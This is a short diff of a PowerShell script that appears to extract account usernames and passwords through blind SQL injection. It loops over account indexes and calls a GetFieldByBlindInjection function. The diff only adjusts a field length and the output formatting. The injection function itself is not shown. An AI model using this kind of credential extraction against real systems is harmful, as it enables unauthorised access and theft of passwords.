@@ -198,7 +198,7 @@ for ($accIndex = 4; $accIndex -le 4; $accIndex++) {
             $characterLength = 5
         }
         2 {
-            $characterLength = 2
+            $characterLength = 3
         }
         3 {
             $characterLength = 7
@@ -240,7 +240,8 @@ for ($accIndex = 4; $accIndex -le 4; $accIndex++) {
     Write-Host ""
 
     $pwdResult = GetFieldByBlindInjection -accountIndex $accIndex -fieldLength $characterLength -fieldName "password";
-    Write-Host "Account-Index: $accIndex | username: $usernameResult | password: $pwdResult |"
+    Write-Host `n" --- Account-Index: $accIndex | username: $usernameResult | password: $pwdResult | --- "
 
     Write-Host ""
 }
+
